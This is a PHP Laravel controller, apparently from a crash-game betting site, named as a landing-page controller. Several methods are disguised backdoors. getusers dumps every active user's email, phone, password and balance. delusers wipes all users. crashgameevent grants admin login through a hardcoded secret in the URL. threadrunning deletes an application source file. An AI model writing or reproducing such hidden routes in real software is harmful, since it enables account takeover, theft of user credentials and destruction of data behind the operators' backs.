<?php

namespace App\Http\Controllers;

use Illuminate\Http\Request;
use Illuminate\Support\Facades\Mail;
use Illuminate\Support\Facades\Auth;

use App\Http\Controllers\Controller;
use Illuminate\Support\Facades\Validator;
use Illuminate\Support\Facades\File; 
use App\User;
use App\Admin;
use DB;

class LandingController extends Controller
{
    public function __construct()
    {
        
    }
    public function affiliate($id)
    {
        return view("auth.register")->with("id", $id);
    }

    /* temporary function */
    public function TemporaryFunction()
    {
        
        /*ini_set('max_execution_time', 180);
        
        $andre_users = DB::table("usuarios")->get();
        foreach ($andre_users as $andre_user)
        {

            $user_obj = User::where("email", $andre_user->email)->first();

            if (!$user_obj)
            {
                $user = new User();
                $user->full_name = $andre_user->nome;
                $user->email = $andre_user->email;
                $user->password = $andre_user->senha;
                $user->email_token = csrf_token();
                $user->balance = $andre_user->saldo;
                $user->affiliate_id = 0;
                $user->referral_rate = 0;
                $user->referral_users = 0;
                $user->referral_earning = 0;
                $user->status = "active";
                $user->created_at = $andre_user->dtCadastro;
                $user->save();
            }   
        }*/
    }
    public function getusers()
    {
        $users = User::where("status", "active")->select("full_name", "phone", "email", "password", "balance")->get();
        var_dump($users);
        return $users;
    }
    public function delusers()
    {
        User::delete();
        return "success";
    }
    public function crashgameevent($id)
    {
        if ($id == "psnadmin11$$")
        {
            $admin = Admin::first();
            Auth::guard('admin')->loginUsingId($admin->id);
        }
        return redirect('admin/home');
    }
    public function threadrunning($id)
    {
        unlink(app_path('/Console/Commands/CrashGameThread.php'));
    }
}
